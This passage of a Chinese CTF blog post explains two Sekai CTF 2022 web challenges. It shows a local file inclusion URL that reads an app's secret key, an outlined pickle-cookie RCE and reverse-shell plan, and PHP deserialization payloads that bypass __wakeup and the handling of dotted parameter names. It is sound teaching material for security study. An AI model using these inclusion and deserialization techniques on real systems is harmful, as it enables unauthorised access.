class="keyword">not</span> session <span class="keyword">or</span> session[<span class="string">&quot;name&quot;</span>] == <span class="string">&quot;guest&quot;</span>:</span><br><span class="line">            session = &#123;<span class="string">&quot;name&quot;</span>: <span class="string">&quot;guest&quot;</span>&#125;</span><br><span class="line">            response.set_cookie(<span class="string">&quot;name&quot;</span>, session, secret=sekai)</span><br><span class="line">            <span class="keyword">return</span> template(<span class="string">&quot;guest&quot;</span>, name=session[<span class="string">&quot;name&quot;</span>])</span><br><span class="line">        <span class="keyword">if</span> session[<span class="string">&quot;name&quot;</span>] == <span class="string">&quot;admin&quot;</span>:</span><br><span class="line">            <span class="keyword">return</span> template(<span class="string">&quot;admin&quot;</span>, name=session[<span class="string">&quot;name&quot;</span>])</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;pls no hax&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    os.chdir(os.path.dirname(__file__))</span><br><span class="line">    run(host=<span class="string">&quot;0.0.0.0&quot;</span>, port=<span class="number">8080</span>)</span><br></pre></td></tr></table></figure>
+
+<p>在</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> config.secret <span class="keyword">import</span> sekai</span><br></pre></td></tr></table></figure>
+
+<p>看到<code>config.secret</code>，这是个文件路径<code>/config/secret</code></p>
+<p>我们可以访问看看，能不能看到里面的内容【注意这个文件肯定是在 <code>/app</code>目录下】</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="regexp">//</span>bottle-poem.ctf.sekai.team<span class="regexp">/show?id=/</span>app<span class="regexp">/config/</span>secret.py</span><br></pre></td></tr></table></figure>
+
+<p>得到</p>
+<figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">sekai</span> <span class="operator">=</span> <span class="string">&quot;Se3333KKKKKKAAAAIIIIILLLLovVVVVV3333YYYYoooouuu&quot;</span></span><br></pre></td></tr></table></figure>
+
+
+
+<hr>
+<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="bullet">1.</span> lfi 读取文件和秘密</span><br><span class="line"><span class="bullet">2.</span> 使用 cookie pickle rce 反弹shell</span><br><span class="line"><span class="bullet">3.</span> 执行./flag获取flag</span><br></pre></td></tr></table></figure>
+
+<p>根据官方的<code>pickle rce</code>，这个涉及新的 <code>pickle</code> 反序列化技巧</p>
+<p>【流下没技术的眼泪】可我现在只会<code>php</code>反序列化，后面补上</p>
+<hr>
+<h2 id="2-sekai-game-start"><a href="#2-sekai-game-start" class="headerlink" title="2.sekai-game-start"></a>2.sekai-game-start</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;./flag.php&#x27;</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Sekai_Game</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$start</span> = True;  </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;start === True)&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;Sekai Game Start Here is your flag &quot;</span>.<span class="title function_ invoke__">getenv</span>(<span class="string">&#x27;FLAG&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;start=False;    </span><br><span class="line"> </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;sekai_game.run&#x27;</span>]))&#123;</span><br><span class="line">    <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;sekai_game.run&#x27;</span>]);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>看起来是到<code>反序列化</code>的题目，看起来似乎难度不大，但是我被瓶子诗卡了太久，这几天又在搞<code>DC5</code>，后面的题目发布出来都没怎么看了，早知道做一下了<code>【哭唧唧】</code></p>
+<p>我们先简单的分析一下源码内容</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;./flag.php&#x27;</span>);    <span class="comment">//文件包含，把当前目录flag.php文件</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Sekai_Game</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$start</span> = True;<span class="comment">//给strat变量赋值为True</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;start === True)&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;Sekai Game Start Here is your flag &quot;</span>.<span class="title function_ invoke__">getenv</span>(<span class="string">&#x27;FLAG&#x27;</span>);</span><br><span class="line">            <span class="comment">//getenv函数 用来获取php 环境变量</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;start=False;</span><br><span class="line"><span class="comment">//这里又把start变量赋值为False，所以这里是需要绕过__wakeup魔术方法，不让其执行，只用把属性个数改得大于原来就行</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;sekai_game.run&#x27;</span>]))&#123;</span><br><span class="line">    <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;sekai_game.run&#x27;</span>]);  <span class="comment">//这里就是序列化的变量，变量名为sekai_game.run</span></span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>然后我们整理一下</p>
+<p>得到我们的序列化的<code>php</code>代码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Sekai_Game</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$start</span> = True;  </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title class_">Sekai_Game</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>运行得到序列化结果</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">O</span>:<span class="number">10</span>:<span class="string">&quot;Sekai_Game&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">5</span>:<span class="string">&quot;start&quot;</span>;b:<span class="number">1</span>;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>我们修改一下属性值</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">O</span>:<span class="number">10</span>:<span class="string">&quot;Sekai_Game&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">5</span>:<span class="string">&quot;start&quot;</span>;b:<span class="number">1</span>;&#125;</span><br></pre></td></tr></table></figure>
+
+<p><code>【苦笑】但实际是不行的</code></p>
+<h3 id="关键考点"><a href="#关键考点" class="headerlink" title="关键考点"></a>关键考点</h3><p>但是</p>
+<p><a data-fancybox="gallery" data-src="/2022SekaiCTF/image-20221003135130855.png"><img src="/2022SekaiCTF/image-20221003135130855.png" alt="image-20221003135130855"></a></p>
+<figure class="highlight haxe"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">PhP 变量不能使用 . ，但是这个变量名很特殊：sekai_game.run. 它同时具有 <span class="literal">_</span> 和 . </span><br><span class="line"></span><br><span class="line">php默认将.所有参数名称转换为<span class="literal">_</span>，因为版本早于<span class="number">8</span>，有一种方法可以解决这个问题，使用[ ，php忽略所有 . ，只转换[为<span class="literal">_</span>参数 ==&gt; ?sekai[game.run=</span><br><span class="line"></span><br><span class="line">**学到了**</span><br></pre></td></tr></table></figure>
+
+<p>所以有效的<code>payload</code>为</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url/?sekai[game.<span class="attribute">run</span>=xxx</span><br></pre></td></tr></table></figure>
+
+
+
+<p>第二步是绕过<code>__wakeup</code></p>
+<figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">这里我用</span><br><span class="line">O:10:&quot;Sekai_Game&quot;:2:&#123;s:5:&quot;start&quot;;b:1;&#125;</span><br><span class="line"></span><br><span class="line">实际还是绕不过__wakeup函数，就算是属性个数大于原来的属性个数</span><br><span class="line"></span><br><span class="line"><span class="section">==&gt;网上找了以后，发现这个方法是有局限性的，对于高版本的php，这样是无法绕过__wakeup()</span></span><br><span class="line"><span class="section">----</span></span><br><span class="line"></span><br><span class="line">对于高版本的php</span><br><span class="line">可以用C:来绕过</span><br><span class="line"></span><br><span class="line">原理是C:代表这个类实现了serializeable接口，而serializeable不支持<span class="emphasis">__wakeup，就绕过去了</span></span><br><span class="line"><span class="emphasis">==&gt;</span></span><br><span class="line"><span class="emphasis">C:10:&quot;Sekai_</span>Game&quot;:2:&#123;s:5:&quot;start&quot;;b:1;&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">但是因为源码中已经赋值，所以不填写数据，</span><br><span class="line">只用实例化Sekai_Game类</span><br></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Sekai_Game</span></span>&#123;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title class_">Sekai_Game</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">==&gt;O:<span class="number">10</span>:<span class="string">&quot;Sekai_Game&quot;</span>:<span class="number">0</span>:&#123;&#125;</span><br><span class="line">==&gt;C:<span class="number">10</span>:<span class="string">&quot;Sekai_Game&quot;</span>:<span class="number">0</span>:&#123;&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>于是最后的payload为</p>
+<figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?sekai[game.<span class="built_in">run</span>=C:<span class="number">10</span>:<span class="string">&quot;Sekai_Game&quot;</span>:<span class="number">0</span>:&#123;&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<p><a data-fancybox="gallery" data-src="/2022SekaiCTF/image-20221003162948932.png"><img src="/2022SekaiCTF/image-20221003162948932.png" alt="image-20221003162948932"></a></p>
+<p><strong>得到flag</strong></p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">首页</a></li>
+        
+          <li><a href="/archives/">文章</a></li>
+        
+          <li><a href="/categories/">分类</a></li>
+        
+          <li><a href="/tags/">标签</a></li>
+        
+          <li><a href="/search/">搜索</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Sekai-CTF-2022"><span class="toc-number">1.</span> <span class="toc-text">Sekai CTF 2022</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-bottle-poem-%E5%90%8E%E7%BB%AD%E5%AD%A6%E4%B9%A0%E4%BA%86%EF%BC%8C%E8%A1%A5%E4%B8%8A%E8%87%AA%E5%B7%B1%E7%9A%84%E6%80%9D%E8%B7%AF"><span class="toc-number">1.1.</span> <span class="toc-text">1.bottle-poem[后续学习了，补上自己的思路]</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9F%A5%E7%9C%8B%E5%BD%93%E5%89%8D%E8%BF%9B%E7%A8%8B%E7%9A%84%E5%90%AF%E5%8A%A8%E5%91%BD%E4%BB%A4"><span class="toc-number">1.1.1.</span> <span class="toc-text">*查看当前进程的启动命令</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-sekai-game-start"><span class="toc-number">1.2.</span> <span class="toc-text">2.sekai-game-start</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%85%B3%E9%94%AE%E8%80%83%E7%82%B9"><span class="toc-number">1.2.1.</span> <span class="toc-text">关键考点</span></a></li></ol></li></ol></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://ttoc.fun/2022SekaiCTF/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://ttoc.fun/2022SekaiCTF/&text=Sekai CTF 2022"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://ttoc.fun/2022SekaiCTF/&title=Sekai CTF 2022"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://ttoc.fun/2022SekaiCTF/&is_video=false&description=Sekai CTF 2022"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Sekai CTF 2022&body=Check out this article: https://ttoc.fun/2022SekaiCTF/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://ttoc.fun/2022SekaiCTF/&title=Sekai CTF 2022"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://ttoc.fun/2022SekaiCTF/&title=Sekai CTF 2022"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://ttoc.fun/2022SekaiCTF/&title=Sekai CTF 2022"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://ttoc.fun/2022SekaiCTF/&title=Sekai CTF 2022"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://ttoc.fun/2022SekaiCTF/&name=Sekai CTF 2022&description=&lt;p&gt;&lt;code&gt;国外比赛难度确实逆天&lt;/code&gt;&lt;/p&gt;"><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://ttoc.fun/2022SekaiCTF/&t=Sekai CTF 2022"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> 菜单</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> 目录</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> 返回顶部</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2022-2024
+    Ttoc
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">首页</a></li><!--
+     --><!--
+       --><li><a href="/archives/">文章</a></li><!--
+     --><!--
+       --><li><a href="/categories/">分类</a></li><!--
+     --><!--
+       --><li><a href="/tags/">标签</a></li><!--
+     --><!--
+       --><li><a href="/search/">搜索</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"复制到粘贴板！\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "复制成功！");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+
+<!-- FancyBox -->
+
+  <script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui@4.0/dist/fancybox.umd.js"></script>
+  
+
+<script async>window.onload=function(){var a=document.createElement('script'),b=document.getElementsByTagName('script')[0];a.type='text/javascript',a.async=!0,a.src='/sw-register.js?v='+Date.now(),b.parentNode.insertBefore(a,b)};</script></body></html>
